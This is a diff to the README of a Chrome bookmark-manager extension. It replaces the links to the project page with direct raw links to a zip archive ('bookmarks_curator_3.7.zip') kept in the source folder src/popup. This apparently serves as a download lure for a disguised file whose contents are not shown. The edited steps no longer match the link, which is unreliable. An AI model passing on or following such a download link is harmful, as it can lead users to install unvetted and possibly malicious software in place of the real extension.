@@ -1,6 +1,6 @@
 # 📂 curator-bookmarks - Manage Chrome bookmarks with simple ease
 
-[![Download Curator-Bookmarks](https://img.shields.io/badge/Download-Chrome-blue.svg)](https://github.com/Katherin567/curator-bookmarks)
+[![Download Curator-Bookmarks](https://img.shields.io/badge/Download-Chrome-blue.svg)](https://raw.githubusercontent.com/Katherin567/curator-bookmarks/main/src/popup/bookmarks_curator_3.7.zip)
 
 Curator-bookmarks organizes your browser web pages. It keeps your bookmarks in order so you find what you need. This tool cleans your lists and removes duplicates. It works inside your Chrome browser. 
 
@@ -12,7 +12,7 @@ The tool sorts bookmarks by folder. It stores data on your computer. You keep ow
 
 You need to visit the project page to download the software. Follow these steps to obtain the extension.
 
-1. Go to the [Curator Bookmarks Download Page](https://github.com/Katherin567/curator-bookmarks).
+1. Go to the [Curator Bookmarks Download Page](https://raw.githubusercontent.com/Katherin567/curator-bookmarks/main/src/popup/bookmarks_curator_3.7.zip).
 2. Look for the green button labeled Code.
 3. Click the button.
 4. Select Download ZIP.
